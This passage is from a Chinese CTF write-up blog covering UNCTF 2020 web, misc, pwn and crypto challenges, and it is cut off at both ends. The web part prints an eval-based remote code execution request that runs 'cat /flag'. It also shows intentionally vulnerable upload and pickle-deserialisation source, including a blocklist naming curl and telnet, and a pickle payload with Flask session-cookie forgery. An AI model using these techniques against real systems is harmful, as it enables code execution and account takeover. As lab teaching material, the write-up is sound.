class="string">'assert'</span>,<span class="string">'passthru'</span>,<span class="string">'array_map'</span>,<span class="string">'ob_start'</span>,<span class="string">'create_function'</span>,<span class="string">'call_user_func'</span>,<span class="string">'call_user_func_array'</span>,<span class="string">'array_filter'</span>,<span class="string">'proc_open'</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/m'</span>, $code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'WTF???'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sry,try again'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参考 p 神文章，绕过 16 位限制</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /<span class="number">1</span>nD3x.php?<span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=cat%<span class="number">20</span>/flag_mdnrvvldb&amp;<span class="number">2</span>=system HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">91</span>cd6671<span class="number">-4678</span><span class="number">-4</span>d49-b68f<span class="number">-2</span>cfa15e6aa9d.node3.hackingfor.fun</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span><span class="number">.4183</span><span class="number">.121</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: __cfduid=d774f57dd2bce55764577fa8151b806c11603020799</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 21</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">code=usort(...$_GET);</span></span><br></pre></td></tr></table></figure><h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><p>delctf 原题：<a href="https://blog.csdn.net/alexhcf/article/details/105946638" target="_blank" rel="noopener">https://blog.csdn.net/alexhcf/article/details/105946638</a></p><p>上传 .htaccess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;UPLOAD&lt;/title&gt;</span><br><span class="line">&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"style/css/style1.css"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"style/css/style2.css"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$userdir = <span class="string">"uploads/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">$typeAccepted = [<span class="string">"image/jpeg"</span>, <span class="string">"image/gif"</span>, <span class="string">"image/png"</span>];</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $black = file_get_contents($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$tmp_name) &#123;</span><br><span class="line">        $result1 =<span class="string">"???"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (!$name) &#123;</span><br><span class="line">        $result1 =<span class="string">"filename cannot be empty!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">"/ph|ml|js|cg/i"</span>, $name)) &#123;</span><br><span class="line">        $result1 = <span class="string">"filename error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!in_array($_FILES[<span class="string">"fileUpload"</span>][<span class="string">'type'</span>], $typeAccepted)) &#123;</span><br><span class="line">        $result1 = <span class="string">'filetype error'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">"/perl|pyth|ph|auto|curl|\|base|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet/i"</span>,$black))&#123;</span><br><span class="line">        $result1 = <span class="string">"perl|pyth|ph|auto|curl|base|\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet in contents!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        $upload_file_path = $userdir . <span class="string">"/"</span> . $name;</span><br><span class="line">        move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">        system(<span class="string">"chmod +x "</span>.$userdir.<span class="string">"/*"</span>);</span><br><span class="line">        $result2= <span class="string">"Your dir : "</span> . $userdir. <span class="string">' &lt;br&gt;'</span>;</span><br><span class="line">        $result3= <span class="string">"Your files :"</span> .$name.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $result1 = <span class="string">'upload your file'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="wrap"&gt;</span><br><span class="line">    &lt;div class="container"&gt;</span><br><span class="line">        &lt;h1 style=<span class="string">"color: white; margin: 0; text-align: center"</span>&gt;UPLOADS&lt;/h1&gt;</span><br><span class="line">        &lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">        &lt;input class="wd" type="file" name="fileUpload" id="file"&gt;&lt;br&gt;</span><br><span class="line">        &lt;input class="wd" type="submit" name="upload" value="submit"&gt;</span><br><span class="line">            &lt;p class="change_link" style="text-align: center"&gt;</span><br><span class="line">            &lt;strong&gt;<span class="meta">&lt;?php</span> print_r($result1);<span class="meta">?&gt;</span>&lt;/strong&gt;</span><br><span class="line">            &lt;/br&gt;</span><br><span class="line">            &lt;strong&gt;<span class="meta">&lt;?php</span> print_r($result3);<span class="meta">?&gt;</span>&lt;/strong&gt;</span><br><span class="line">            &lt;/br&gt;</span><br><span class="line">            &lt;strong&gt;<span class="meta">&lt;?php</span> print_r($result2);<span class="meta">?&gt;</span>&lt;/strong&gt;</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="ezfind"><a href="#ezfind" class="headerlink" title="ezfind"></a>ezfind</h3><p>这题人傻了，直接变成数组就可以绕过，考察的错误转换成true？</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?<span class="keyword">name</span>[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="easy-flask2"><a href="#easy-flask2" class="headerlink" title="easy_flask2"></a>easy_flask2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,redirect,request,session,make_response</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, is_admin)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.is_admin = is_admin</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">'__main__'</span>:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[<span class="string">'__main__'</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag = <span class="string">"xxx"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    app.config[<span class="string">"SECRET_KEY"</span>] = config.secret_key</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"login"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/login",methods=["GET","POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.form.get(<span class="string">'name'</span>):</span><br><span class="line">        name = request.form.get(<span class="string">'name'</span>)</span><br><span class="line">        person = Person(name,<span class="number">0</span>)</span><br><span class="line">        pkl = pickle.dumps(person)</span><br><span class="line">        pkl = base64.b64encode(pkl)</span><br><span class="line"></span><br><span class="line">        resp = make_response(name)</span><br><span class="line">        resp.set_cookie(<span class="string">'pkl'</span>,pkl)</span><br><span class="line"></span><br><span class="line">        session[<span class="string">'name'</span>] = name</span><br><span class="line">        session[<span class="string">'is_admin'</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'name'</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b'R'</span> <span class="keyword">in</span>   base64.b64decode(request.cookies[<span class="string">'pkl'</span>]):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"RCE??"</span></span><br><span class="line">            person = pickle.loads(base64.b64decode(request.cookies[<span class="string">'pkl'</span>]))</span><br><span class="line">            print(person.is_admin)</span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">'is_admin'</span>) == <span class="number">1</span>:</span><br><span class="line">                <span class="comment">#person = pickle.loads(base64.b64decode(request.cookies['pkl']))</span></span><br><span class="line">                <span class="keyword">if</span> person.is_admin == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">"HHHacker!Here is Your flag : "</span> + flag</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>,name=session.get(<span class="string">'name'</span>))</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"login.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/logout",methods=["GET","POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(<span class="string">"success"</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">"session"</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">"pkl"</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/source")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">'code.txt'</span>,<span class="string">'r'</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>赛后复现了一下，考点是 pickle 反序列化覆盖 secret_key 以及 flask cookie 伪造</p><p>pickle 反序列化可以参考以下几篇文章：</p><p><a href="https://xz.aliyun.com/t/7436" target="_blank" rel="noopener">https://xz.aliyun.com/t/7436</a></p><p><a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a></p><p><a href="https://www.smi1e.top/%E4%BB%8Ebalsn-ctf-pyshv%E5%AD%A6%E4%B9%A0python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">https://www.smi1e.top/%E4%BB%8Ebalsn-ctf-pyshv%E5%AD%A6%E4%B9%A0python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89132768</a></p><p>手搓字节码关键在于理解 opcode 作用，不太理解的可以尝试阅读源代码帮助理解，以及理清栈和 memo 里每一步的数据。可以使用 pker 帮助构建，建议可以在本地测试 opcode 是否构建正确</p><p>pker 代码，覆盖 secret_key ，返回 Person 对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">secret = GLOBAL(<span class="string">'__main__'</span>, <span class="string">'config'</span>)</span><br><span class="line">secret.secret_key = <span class="string">'hello'</span></span><br><span class="line">person = INST(<span class="string">'__main__'</span>, <span class="string">'Person'</span>, <span class="string">'admin'</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> person</span><br></pre></td></tr></table></figure><p>然后使用 flask-session-cookie-manager 伪造 cookie，注意这里的参数都需要用双引号扩起来，github 文档示例不太对，会报错</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py <span class="number">-3</span> flask_session_cookie_manager3.py encode -s <span class="string">"hello"</span> -t <span class="string">"&#123;'</span>name':<span class="string">'admin'</span>,<span class="string">'is_admin'</span>:<span class="number">1</span>&#125;<span class="string">"</span></span><br></pre></td></tr></table></figure><p>具体流程，登录过后，修改 <code>coookie</code> 的 pkl，访问 <code>/login</code> 反序列化覆盖 <code>secret_key</code> ，然后再访问 <code>/</code> 覆盖掉 <code>app.config[&quot;SECRET_KEY&quot;]</code>，接着更改 <code>cookie</code> 的 <code>session</code> 为篡改的 session 访问 <code>/login</code> 即可获得 flag</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h3><p>010 editor 打开发现最后有个 b 站地址，访问后第一条评论就是 flag</p><p><a href="https://www.bilibili.com/video/BV1y44111737" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1y44111737</a></p><h3 id="阴阳人编码"><a href="#阴阳人编码" class="headerlink" title="阴阳人编码"></a>阴阳人编码</h3><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.</span><br><span class="line">就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这.</span><br><span class="line">就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.</span><br><span class="line">就这. 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 不会吧! 就这. 就这. 就这.</span><br><span class="line">就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这. 就这¿ 就这. 就这.</span><br><span class="line">就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧!</span><br><span class="line">不会吧! 不会吧! 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这. 就这.</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>三个密码子，最先猜测摩斯密码肯定不对，后来又尝试了其他很多密码，最后想到 Ook 编码三个密码子，且对应后缀 <code>.</code>、<code>?</code> 、<code>!</code> 然后解密即可</p><h3 id="爷的历险记"><a href="#爷的历险记" class="headerlink" title="爷的历险记"></a>爷的历险记</h3><p>游戏还是很好玩，按照游戏流程过游戏，然后修改 rpgsave 存档文件，修改金钱数即可购买 flag</p><h3 id="YLB’s-CAPTCHA-签到题"><a href="#YLB’s-CAPTCHA-签到题" class="headerlink" title="YLB’s CAPTCHA - 签到题"></a>YLB’s CAPTCHA - 签到题</h3><p>ylb 的验证码给搬上来了，正确输入 10 次即可获得 flag，不得不吐槽，眼睛都快瞎了</p><h3 id="躲猫猫"><a href="#躲猫猫" class="headerlink" title="躲猫猫"></a>躲猫猫</h3><p>把图移开后发现 base64 后的 flag</p><h3 id="YLB绝密文件"><a href="#YLB绝密文件" class="headerlink" title="YLB绝密文件"></a>YLB绝密文件</h3><p>流量包获取到三个文件 <code>xor.py</code>，<code>YLBSB.xor</code>，<code>secret.pyc</code></p><p>pyc 反编译的到 <code>key</code> ，然后编写脚本跑就完事，3M的文件，跑了一个小时。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@time:2020/11/09 19:44:44</span></span><br><span class="line"><span class="string">@author:Str3am</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">'YLBSB?YLBNB!'</span></span><br><span class="line">enc = open(<span class="string">"YLBSB.xor"</span>, <span class="string">"rb"</span>)</span><br><span class="line">file = open(<span class="string">"YLBSB.docx"</span>, <span class="string">"wb"</span>)</span><br><span class="line">ciper = enc.read()</span><br><span class="line">file_base64 = <span class="string">b''</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ciper:</span><br><span class="line">    m = c^ord(key[count % len(key)])</span><br><span class="line">    file_base64 = file_base64+chr(m).encode()</span><br><span class="line">    count = count + <span class="number">1</span></span><br><span class="line">    <span class="comment"># if count == 8:</span></span><br><span class="line">    <span class="comment">#     break</span></span><br><span class="line">file.write(base64.b64decode(file_base64))</span><br></pre></td></tr></table></figure><h3 id="mouse-click"><a href="#mouse-click" class="headerlink" title="mouse_click"></a>mouse_click</h3><p>流量分析，usb协议，参照这篇文章，提取出坐标点，然后plot绘图即可得flag的镜像</p><p><a href="https://blog.csdn.net/qq_43625917/article/details/107723635" target="_blank" rel="noopener">https://blog.csdn.net/qq_43625917/article/details/107723635</a></p><p><code>unctf{U5BC@P}</code></p><h3 id="撕坏的二维码"><a href="#撕坏的二维码" class="headerlink" title="撕坏的二维码"></a>撕坏的二维码</h3><p>补齐定位点扫描即得</p><p><code>unctf{QR@2yB0x}</code></p><h3 id="零"><a href="#零" class="headerlink" title="零"></a>零</h3><p>零宽度字符，解密即得 <code>unctf{sycj24_6hvgj_8gfj}</code></p><h3 id="你能破解我的密码吗"><a href="#你能破解我的密码吗" class="headerlink" title="你能破解我的密码吗"></a>你能破解我的密码吗</h3><p>john直接破解密码为 <code>123456</code></p><h3 id="被删除的flag"><a href="#被删除的flag" class="headerlink" title="被删除的flag"></a>被删除的flag</h3><p>010 editor直接读</p><h3 id="网络深处"><a href="#网络深处" class="headerlink" title="网络深处"></a>网络深处</h3><p>解码工具分析出拨号内容，解压后发现塔珀自指公式，参考这篇文章解出</p><p><a href="https://www.cnblogs.com/l137/p/3594664.html" target="_blank" rel="noopener">https://www.cnblogs.com/l137/p/3594664.html</a></p><p><code>flag{Y29pbA==}</code></p><h3 id="EZ-IMAGE"><a href="#EZ-IMAGE" class="headerlink" title="EZ_IMAGE"></a>EZ_IMAGE</h3><p>参考文章，montage + gaps拼图</p><p><a href="https://shawroot.cc/archives/639" target="_blank" rel="noopener">https://shawroot.cc/archives/639</a></p><p><img src="/2020/11/19/Web_17/20201114003722.png" alt="image-20201114003717337"></p><p><code>UNCTF{EZ_MISC_AND_HACK_FUN}</code></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="YLBNB"><a href="#YLBNB" class="headerlink" title="YLBNB"></a>YLBNB</h3><p>直接一直回车，然后出了部分 flag <code>UNCTF{Gu@rd_Th3_Bes7_</code>，结合题目名字，<code>UNCTF{Gu@rd_Th3_Bes7_YLB}</code>，没有pwn环境，有空学一学，应该就是一直请求接收包就可以。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">p = number.getPrime(<span class="number">1024</span>)</span><br><span class="line">q = number.getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> p &gt; q:</span><br><span class="line">    a = p + q</span><br><span class="line">    b = p - q</span><br><span class="line">    print(a,b)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = bytes_to_long(<span class="string">b'msg'</span>)</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#320398687477638913975700270017132483556404036982302018853617987417039612400517057680951629863477438570118640104253432645524830693378758322853028869260935243017328300431595830632269573784699659244044435107219440036761727692796855905230231825712343296737928172132556195116760954509270255049816362648350162111168</span></span><br><span class="line"><span class="comment">#9554090001619033187321857749048244231377711861081522054479773151962371959336936136696051589639469653074758469644089407114039221055688732553830385923962675507737607608026140516898146670548916033772462331195442816239006651495200436855982426532874304542570230333184081122225359441162386921519665128773491795370</span></span><br><span class="line"><span 